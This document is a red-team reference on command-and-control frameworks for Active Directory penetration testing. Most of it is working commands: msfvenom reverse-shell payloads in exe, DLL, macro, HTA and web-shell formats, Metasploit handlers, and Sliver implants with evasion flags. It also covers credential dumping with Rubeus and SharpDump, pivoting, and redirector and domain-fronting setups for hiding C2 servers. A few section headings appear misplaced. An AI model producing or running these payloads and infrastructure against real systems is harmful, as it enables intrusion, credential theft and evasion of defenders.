# C2 Frameworks for AD Pentest

Command and control infrastructure selection, setup, and operational guidance.

## C2 Selection Decision Tree

**Need free + mature + huge module library?**
→ Metasploit Framework

**Need modern + evasive + free?**
→ Sliver

**Need team collaboration + advanced evasion?**
→ Havoc or Mythic

**Simulating APT / red team engagement?**
→ Cobalt Strike (if licensed)

**Quick reverse shell handler only?**
→ Villain or Metasploit multi/handler

**Cross-platform Linux/Mac compromise?**
→ Sliver, Mythic (Poseidon), or Metasploit

## Metasploit Framework

### Basic Listener Setup

```bash
msfconsole

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
```

### Payload Generation with msfvenom

**Windows executables:**

```bash
# Staged (smaller initial payload)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe

# Stageless (self-contained, larger)
msfvenom -p windows/x64/meterpreter_reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT -f exe -o shell_stageless.exe

# With encoder (basic evasion)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT -e x64/xor_dynamic -i 3 -f exe -o shell_encoded.exe
```

**PowerShell payloads:**

```bash
# PowerShell script
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT -f psh -o shell.ps1

# PowerShell one-liner (base64)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT -f psh-cmd
```

**DLL payloads:**

```bash
# For DLL injection/sideloading
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT -f dll -o payload.dll
```

**Other useful formats:**

```bash
# Raw shellcode (for custom loaders)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT -f raw -o shellcode.bin

# C array (for embedding in code)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT -f c

# HTA (HTML Application)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT -f hta-psh -o payload.hta

# VBA macro (for Office docs)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT -f vba

# ASPX (for web shells)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx

# Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf
```

### Staged vs Stageless

**Staged (`meterpreter/reverse_tcp`):**
- Smaller initial payload (~100KB)
- Downloads full Meterpreter in stage 2
- Better for constrained delivery (macros, exploits)
- Requires stable network for staging

**Stageless (`meterpreter_reverse_tcp`):**
- Complete payload in one file (~1MB+)
- No secondary download needed
- More reliable in unstable networks
- Easier to detect (larger artifact)

**Token manipulation:**

## Sliver

### Server Setup

```bash
# Start Sliver server
sliver-server

# Inside Sliver console
multiplayer                 # Enable team server (optional)
```

### Implant Generation

**Basic implant:**

```
generate --mtls $LHOST:$LPORT --os windows --arch amd64 --save implant.exe
```

**Beacon (async communication):**

```
generate beacon --mtls $LHOST:$LPORT --os windows --arch amd64 \
  --seconds 5 --jitter 3 --save beacon.exe
```

**Advanced options:**

```
generate --mtls $LHOST:$LPORT --os windows --arch amd64 \
  --format exe --save custom.exe \
  --skip-symbols \              # Remove debug symbols
  --debug \                     # Enable debug output
  --evasion \                   # Enable evasion features
  --name CustomImplant          # Custom implant name
```

**Cross-platform:**

```
# Linux
generate --mtls $LHOST:$LPORT --os linux --arch amd64 --save implant.elf

# macOS
generate --mtls $LHOST:$LPORT --os darwin --arch amd64 --save implant.macho
```

### Listeners

```
mtls --lhost 0.0.0.0 --lport $LPORT    # MTLS listener
http --lhost 0.0.0.0 --lport 80        # HTTP listener
https --lhost 0.0.0.0 --lport 443      # HTTPS listener

jobs                                    # List active listeners
```

### Implant Interaction

```

background                 # Background session

# Basic commands
shell                      # Interactive shell
execute $COMMAND           # Execute command
upload /local/file /remote/path
download /remote/file /local/path
```

### Post-Exploitation

**Process operations:**

```
ps                         # List processes
migrate $PID               # Migrate to process
execute-assembly /path/to/assembly.exe args  # Execute .NET assembly
sideload /path/to/dll      # Sideload DLL
```

**Credential access:**

```
# Built-in credential dumping
execute-assembly /path/to/SharpDump.exe
execute-assembly /path/to/Rubeus.exe dump

# Or use extensions
armory install rubeus       # Install Rubeus extension
rubeus dump
```

**Pivoting:**

```
# SOCKS proxy
socks5 start
socks5 list
socks5 stop --id $ID

# Port forwarding
portfwd add --remote $RHOST:$RPORT --bind 127.0.0.1:$LPORT

portfwd rm --id $ID

# Reverse port forward (target → attacker)
portfwd add --reverse --remote 0.0.0.0:$RPORT --bind 127.0.0.1:$LPORT
```

**Network enumeration:**

```
ifconfig                   # Network interfaces
netstat                    # Network connections
ping $HOST                 # Ping host (via implant)
```

### Demon Agent

**Key capabilities:**
- Built-in BOF (Beacon Object File) execution
- Token manipulation and impersonation
- Indirect syscalls for evasion
- Sleep obfuscation
- Stack spoofing

**Listener types:**
- HTTP/HTTPS (with customizable headers and URIs)
- SMB (for peer-to-peer communication)

**Profile customization:**

```yaml
# Example havoc.yaotl snippet
Teamserver:
  Host: 0.0.0.0
  Port: 40056

Operators:
  - Name: operator1
    Password: password123

Demon:
  Sleep: 5
  Jitter: 30
  
Listener:
  Name: HTTPS Listener
  Protocol: https
  Hosts:
    - $LHOST
  Port: 443
```

### Key Features

**Sleep obfuscation:**
- Encrypts implant memory during sleep
- Reduces in-memory signature exposure

**Indirect syscalls:**
- Bypasses userland API hooks
- Direct kernel syscall invocation

**Token manipulation:**
- Built-in `make_token`, `steal_token`, `rev2self`

**BOF execution:**
- Run Cobalt Strike-compatible BOFs
- Minimal footprint for common tasks

## Cobalt Strike

*Overview only – requires commercial license*

### Architecture

**Teamserver + Client model:**
- Central teamserver hosts listeners and payloads
- Multiple operators connect with client UI
- Shared session access and logging

### Beacon Types

**HTTP/HTTPS:**
- Standard web-based C2
- Malleable C2 profiles for traffic customization

**DNS:**
- Low-and-slow communication via DNS queries
- Good for egress-restricted environments

**SMB:**
- Peer-to-peer communication
- Beacons proxy through SMB named pipes

**TCP:**
- Direct TCP connection (often for pivoting)

### Key Concepts

**Malleable C2 profiles:**
- Customize HTTP headers, URIs, user-agents
- Transform network traffic to mimic legitimate services
- Example: mimic jQuery, Amazon, Google traffic

**Execute-assembly:**
- Run .NET assemblies in-memory
- No disk touch
- Common with Rubeus, Seatbelt, SharpHound

**Lateral movement:**
- `jump` command: psexec, winrm, wmi
- `spawnas`: spawn process as another user
- `make_token`: create token with credentials

**SOCKS proxy:**
- Route tools through compromised network
- Supports SOCKS4 and SOCKS5

**Aggressor scripting:**
- Automation via custom scripts
- Extend Cobalt Strike functionality
- Community-contributed scripts available

### OPSEC Considerations

- Beacon sleep time and jitter
- Process injection techniques
- Spawnto configuration (which process to inject into)
- Artifact cleanup
- Named pipe names for SMB beacons

## C2 Infrastructure OPSEC

### Redirectors

**socat redirector:**

```bash
socat TCP4-LISTEN:$LPORT,fork TCP4:$C2_SERVER:$C2_PORT
```

**iptables redirector:**

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Redirect traffic
iptables -t nat -A PREROUTING -p tcp --dport $LPORT \
  -j DNAT --to-destination $C2_SERVER:$C2_PORT
iptables -t nat -A POSTROUTING -j MASQUERADE
```

**Cloud redirector (AWS example):**
- Elastic IP on EC2 instance
- Security group allows inbound on $LPORT
- Instance forwards to C2 server
- Kill server if compromised, keep redirector IP

### Domain Fronting / CDN Abuse

**Concept:**
- Use CDN edge nodes as redirectors
- TLS connection to CDN domain (e.g., cloudfront.net)
- HTTP Host header points to attacker-controlled backend

**Note:**
- Many CDNs have mitigations against this
- Effectiveness varies by provider
- Test before relying on it

### SSL Certificate Management

**Self-signed certificate:**

```bash
openssl req -new -x509 -keyout server.key -out server.crt -days 365 -nodes
```

**Let's Encrypt certificate:**

```bash
certbot certonly --standalone -d $DOMAIN
```

**Certificate OPSEC:**
- Use realistic org names and locations
- Match certificate to fronted domain
- Rotate certificates regularly

### Kill Dates and Sleep Times

**Kill date:**
- Set expiration date in implant
- Implant stops beaconing after date
- Prevents long-term discovery

**Sleep time and jitter:**
```
sleep 60 30   # Sleep 60s ±30s jitter
```

- Longer sleep = harder to detect
- Jitter prevents pattern-based detection
- Balance between stealth and responsiveness

### Infrastructure Segmentation

**Best practice:**
- Separate redirector, C2 server, and data exfil server
- Use different cloud providers/ASNs
- Redirector is disposable, C2 server is protected
- Never expose C2 server IP directly

**Example setup:**
```
[Target] → [Redirector 1 (AWS)] → [C2 Server (Hidden VPS)]
         → [Redirector 2 (Azure)]
         
[Target] → [Exfil Redirector] → [Data Server (Separate)]
```

## Tool Selection Workflow

1. **Start with Metasploit if:**
   - Learning post-exploitation
   - Need quick handler for exploit
   - Want extensive module library

2. **Use Sliver if:**
   - Need modern evasion
   - Cross-platform targets
   - Free team server needed

3. **Use Havoc/Mythic if:**
   - Red team engagement
   - Team collaboration critical
   - Need advanced OPSEC

4. **Use Cobalt Strike if:**
   - APT simulation
   - Have commercial license
   - Need mature product support

5. **Use Villain if:**
   - Just need quick shell
   - No post-exploitation needed
   - Rapid exploitation scenario
